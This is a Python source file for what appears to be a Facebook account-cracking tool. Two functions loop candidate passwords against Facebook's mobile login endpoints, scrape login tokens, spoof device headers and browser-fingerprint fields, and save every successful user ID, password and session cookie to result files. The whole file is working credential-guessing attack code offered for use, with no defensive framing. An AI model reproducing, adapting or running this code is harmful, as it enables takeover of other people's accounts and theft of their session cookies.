import random,re
from tools.bahan import *
from tools import encpass
from socialagent import socialagent

# --> Useragent
def agent_moz():
	ua = socialagent()
	webview = False # default False
	dalvik = False
	device_model = None # default None -> random
	device_version = None # default None -> random
	chrome_version = None # default None -> random
	device = None # default None -> random
	device_model = None # default None -> random
	device_version = None # default None -> random
	device_armeabi = None # default None -> random
	device_density = None # default None -> random
	device_language = None # default None -> random
	device_operator = None # default None -> random
	facebook_code = None # default None -> random
	facebook_build = None # default None -> random
	facebook_version = None # default None -> random
	facebook_package = None # default None -> random
	facebook_user_agent = ua.facebook(dalvik=dalvik, device=device, device_model=device_model, device_version=device_version, 
	device_armeabi=device_armeabi, device_density=device_density, 
	device_language=device_language, device_operator=device_operator, 
	facebook_code=facebook_code, facebook_build=facebook_build, 
	facebook_version=facebook_version, facebook_package=facebook_package)
	chrome_user_agent = ua.chrome(webview=webview, device_model=device_model,
	device_version=device_version, chrome_version=chrome_version )
	chrome = chrome_user_agent
	facebook = facebook_user_agent
	chfa = chrome+" "+facebook
	return random.choice([chrome,chfa])
# --> Start Crack
def crack(user_id, user_pw):
	global loop, ok, cp
	print('\r%sRun %s%s%s/%s%s%s, Ok = %s%s%s, Cp = %s%s%s   '%(u,h,loop,p,k,len(ida),p,h,ok,p,k,cp,p), end='')
	for pw in user_pw:
		try:
			with requests.Session() as rsn:
				dev = random.choice(devices)
				ua = agent_moz()
				rsn.headers.update({
					'Host': 'm.prod.facebook.com',
					'cache-control': 'max-age=0',
					'dpr': '1.600000023841858',
					'viewport-width': '980',
					'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
					'sec-ch-ua-mobile': '?1',
					'sec-ch-ua-platform': '"Android"',
					'sec-ch-ua-platform-version': '"13.0.0"',
					'sec-ch-ua-model': dev,
					'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.112", "Google Chrome";v="118.0.5993.112", "Not=A?Brand";v="99.0.0.0"',
					'sec-ch-prefers-color-scheme': 'light',
					'upgrade-insecure-requests': '1',
					'user-agent': ua,
					'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
					'sec-fetch-site': 'cross-site',
					'sec-fetch-mode': 'navigate',
					'sec-fetch-user': '?1',
					'sec-fetch-dest': 'document',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				})

				get       = bs(rsn.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=307044283034103&kid_directed_site=0&app_id=307044283034103&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D307044283034103%26redirect_uri%3Dhttps%253A%252F%252Ftdw.telkomsel.com%252Fapi%252Fcallback%252Furl%26scope%3Dpublic_profile%2Bemail%26code_challenge%3Djk79FTi3XD0oH218T9lIq50KUphQCUpO0LYEcojq7-M%26code_challenge_method%3DS256%26state%3Dtkq9pivss73dqmabt4pqs23iqr87oci%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd360c41e-09c2-429e-9fcf-c456068b7818%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftdw.telkomsel.com%2Fapi%2Fcallback%2Furl%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dtkq9pivss73dqmabt4pqs23iqr87oci%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text, 'html.parser')
				form      = get.find('form', {'method': 'post'})
				timeStamp = str(time.time()).split('.')[0]
				cook      = ('; ').join(['%s=%s'%(key, value) for key,value in rsn.cookies.get_dict().items()])
				cook+=f'vpd=v1;868x450x1.600000023841858; dpr=1.600000023841858; locale=jv_ID; wl_cbv=v2;client_version:2376;timestamp:{timeStamp}; m_pixel_ratio=1.600000023841858; wd=450x868'

				headers = {
					'Host': 'm.prod.facebook.com',
					'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
					'sec-ch-ua-mobile': '?1',
					'user-agent': ua,
					'viewport-width': '450',
					'content-type': 'application/x-www-form-urlencoded',
					'x-fb-lsd': re.search('name="lsd" type="hidden" value="(.*?)"', str(get)).group(1),
					'sec-ch-ua-platform-version': '"13.0.0"',
					'x-asbd-id': '129477',
					'dpr': '1.6',
					'sec-ch-ua-full-version-list': '"Chromium";v="118.0.5993.112", "Google Chrome";v="118.0.5993.112", "Not=A?Brand";v="99.0.0.0"',
					'sec-ch-ua-model': dev,
					'sec-ch-prefers-color-scheme': 'light',
					'sec-ch-ua-platform': '"Android"',
					'accept': '*/*',
					'origin': 'https://m.prod.facebook.com',
					'sec-fetch-site': 'same-origin',
					'sec-fetch-mode': 'cors',
					'sec-fetch-dest': 'empty',
					'referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=307044283034103&kid_directed_site=0&app_id=307044283034103&signed_next=1&next=https%3A%2F%2Fm.prod.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D307044283034103%26redirect_uri%3Dhttps%253A%252F%252Ftdw.telkomsel.com%252Fapi%252Fcallback%252Furl%26scope%3Dpublic_profile%2Bemail%26code_challenge%3Djk79FTi3XD0oH218T9lIq50KUphQCUpO0LYEcojq7-M%26code_challenge_method%3DS256%26state%3Dtkq9pivss73dqmabt4pqs23iqr87oci%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd360c41e-09c2-429e-9fcf-c456068b7818%26tp%3Dunspecified&cancel_url=https%3A%2F%2Ftdw.telkomsel.com%2Fapi%2Fcallback%2Furl%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dtkq9pivss73dqmabt4pqs23iqr87oci%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
					'accept-encoding': 'gzip, deflate',
					'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
				}

				data = {
					'm_ts': re.search('"__spin_t":(.*?),', str(get)).group(1),
					'li': re.search('name="li" type="hidden" value="(.*?)"', str(get)).group(1),
					'try_number': '0',
					'unrecognized_tries': '0',
					'email': user_id,
					'prefill_contact_point': user_id,
					'prefill_source': 'browser_dropdown',
					'prefill_type': 'contact_point',
					'first_prefill_source': 'browser_dropdown',
					'first_prefill_type': 'contact_point',
					'had_cp_prefilled': 'true',
					'had_password_prefilled': 'false',
					'is_smart_lock': 'false',
					'bi_xrwh': '0',
					'bi_wvdp': json.dumps({"hwc":True,"hwcr":False,"has_dnt":True,"has_standalone":False,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":True,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":True,"has_meDe":True,"has_creds":True,"has_hwi_bt":False,"has_agjsi":False,"iframeProto":"function get contentWindow() { [native code] }","remap":False,"iframeData":{"hwc":True,"hwcr":False,"has_dnt":True,"has_standalone":False,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":True,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":True,"has_meDe":True,"has_creds":True,"has_hwi_bt":False,"has_agjsi":False}}),
					'encpass': encpass.password(get, pw),
					'fb_dtsg': re.search('"dtsg":{"token":"(.*?)"', str(get)).group(1),
					'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(get)).group(1),
					'lsd': re.search('name="lsd" type="hidden" value="(.*?)"', str(get)).group(1),
					'__dyn': '',
					'__csr': '',
					'__req': '5',
					'__a': re.search('"encrypted":"(.*?)"', str(get)).group(1),
					'__user': '0'
				}

				post = rsn.post('https://m.prod.facebook.com'+form['action'], headers=headers, data=data, cookies={'cookie': cook}, allow_redirects=False)

				cookie = rsn.cookies.get_dict()
				if 'c_user' in cookie:
					cok = '; '.join(['%s=%s'%(key,value) for key,value in cookie.items()])
					print('\rStatus : %sAccount active%s'%(h,p) + (' ' * 20))
					print('User Id : %s%s%s'%(h,user_id,p))
					print('User Pw : %s%s%s'%(h,pw,p))
					print('%s%s%s\n'%(h,cok,p))
					open('data/result/%s'%(resultNameOk), 'a').write(user_id+'|'+pw+'|'+cok+'\n')
					ok+=1
					return

				elif 'checkpoint' in cookie:
					print('\rStatus : %sAccount inactive%s'%(k,p) + (' ' * 20))
					print('User Id : %s%s%s'%(k,user_id,p))
					print('User Pw : %s%s%s\n'%(k,pw,p))
					open('data/result/%s'%(resultNameCp), 'a').write(user_id+'|'+pw+'\n')
					cp+=1
					return

		except requests.exceptions.ConnectionError:
			time.sleep(5)

	loop+=1
	
# --> Start Crack 2
def crack2(user_id, user_pw):
	global loop, ok, cp
	print('\r%sRun %s%s%s/%s%s%s, Ok = %s%s%s, Cp = %s%s%s   '%(u,h,loop,p,k,len(ida),p,h,ok,p,k,cp,p), end='')
	for pw in user_pw:
		try:
			with requests.Session() as rsn:
				dev = random.choice(devices)
				ua = agent_moz()
				get       = bs(rsn.get('https://iphone.facebook.com/login.php?skip_api_login=1&api_key=347499128655783&kid_directed_site=0&app_id=347499128655783&signed_next=1&next=https%3A%2F%2Fiphone.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D347499128655783%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fwww.hackerrank.com%252Fhackers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D4d2104d261142e7bbee4a2fabfdbe5206af8d63e38420b9a%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5410c61d-e76a-49e0-b537-123252edfe55%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.hackerrank.com%2Fhackers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4d2104d261142e7bbee4a2fabfdbe5206af8d63e38420b9a%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text, 'html.parser')
				form      = get.find('form', {'method': 'post'})
				timeStamp = str(time.time()).split('.')[0]
				cook      = ('; ').join(['%s=%s'%(key, value) for key,value in rsn.cookies.get_dict().items()])
				cook+=f'vpd=v1;868x450x1.600000023841858; dpr=1.600000023841858; locale=jv_ID; wl_cbv=v2;client_version:2376;timestamp:{timeStamp}; m_pixel_ratio=1.600000023841858; wd=450x868'

				headers = {
					"host": "iphone.facebook.com",
					"content-length": "2152",
					"sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
					"sec-ch-ua-mobile": "?1",
					"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36",
					"content-type": "application/x-www-form-urlencoded",
					"x-fb-lsd": "AVoeLaQSDYE",
					"sec-ch-ua-platform-version": '"11.0.0"',
					"x-asbd-id": "129477",
					"sec-ch-ua-full-version-list": '"Chromium";v="128.0.6613.99", "Not;A=Brand";v="24.0.0.0", "Google Chrome";v="128.0.6613.99"',
					"sec-ch-ua-model": '"RMX3171"',
					"sec-ch-prefers-color-scheme": "dark",
					"sec-ch-ua-platform": '"Android"',
					"accept": "*/*",
					"origin": "https://iphone.facebook.com",
					"sec-fetch-site": "same-origin",
					"sec-fetch-mode": "cors",
					"sec-fetch-dest": "empty",
					"referer": "https://iphone.facebook.com/login.php?skip_api_login=1&api_key=347499128655783&kid_directed_site=0&app_id=347499128655783&signed_next=1&next=https%3A%2F%2Fiphone.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fclient_id%3D347499128655783%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fwww.hackerrank.com%252Fhackers%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%26state%3D4d2104d261142e7bbee4a2fabfdbe5206af8d63e38420b9a%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5410c61d-e76a-49e0-b537-123252edfe55%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.hackerrank.com%2Fhackers%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D4d2104d261142e7bbee4a2fabfdbe5206af8d63e38420b9a%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr",
					"accept-encoding": "gzip, deflate, br, zstd",
					"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ms;q=0.6",
				}

				payload = {
					"m_ts": re.search('"__spin_t":(.*?),', str(get)).group(1),
					"li": re.search('name="li" type="hidden" value="(.*?)"', str(get)).group(1),
					"try_number": "0",
					"unrecognized_tries": "0",
					"email": user_id,
					"prefill_contact_point": user_id,
					"prefill_source": "browser_dropdown",
					"prefill_type": "password",
					"first_prefill_source": "browser_dropdown",
					"first_prefill_type": "contact_point",
					"had_cp_prefilled": "true",
					"had_password_prefilled": "true",
					"is_smart_lock": "false",
					"bi_xrwh": "0",
					"bi_wvdp": json.dumps({"hwc":True,"hwcr":False,"has_dnt":True,"has_standalone":False,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":True,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":True,"has_meDe":True,"has_creds":True,"has_hwi_bt":False,"has_agjsi":False,"iframeProto":"function get contentWindow() { [native code] }","remap":False,"iframeData":{"hwc":True,"hwcr":False,"has_dnt":True,"has_standalone":False,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":True,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":True,"has_meDe":True,"has_creds":True,"has_hwi_bt":False,"has_agjsi":False}}),
					"encpass": encpass.password(get, pw),
					"fb_dtsg": re.search('"dtsg":{"token":"(.*?)"', str(get)).group(1),
					"jazoest": re.search('name="jazoest" type="hidden" value="(.*?)"', str(get)).group(1),
					"lsd": re.search('name="lsd" type="hidden" value="(.*?)"', str(get)).group(1),
					"__dyn": "",
					"__csr": "",
					"__req": "2",
					"__fmt": "1",
					"__a": re.search('"encrypted":"(.*?)"', str(get)).group(1),
					"__user": "0"
				}
				post = rsn.post('https://iphone.facebook.com'+form['action'], headers=headers, data=payload, cookies={'cookie': cook}, allow_redirects=False)
				cookie = rsn.cookies.get_dict()
				if 'c_user' in cookie:
					cok = '; '.join(['%s=%s'%(key,value) for key,value in cookie.items()])
					print('\rStatus : %sAccount active%s'%(h,p) + (' ' * 20))
					print('User Id : %s%s%s'%(h,user_id,p))
					print('User Pw : %s%s%s'%(h,pw,p))
					print('%s%s%s\n'%(h,cok,p))
					open('data/result/%s'%(resultNameOk), 'a').write(user_id+'|'+pw+'|'+cok+'\n')
					ok+=1
					return

				elif 'checkpoint' in cookie:
					print('\rStatus : %sAccount inactive%s'%(k,p) + (' ' * 20))
					print('User Id : %s%s%s'%(k,user_id,p))
					print('User Pw : %s%s%s\n'%(k,pw,p))
					open('data/result/%s'%(resultNameCp), 'a').write(user_id+'|'+pw+'\n')
					cp+=1
					return

		except requests.exceptions.ConnectionError:
			time.sleep(5)

	loop+=1
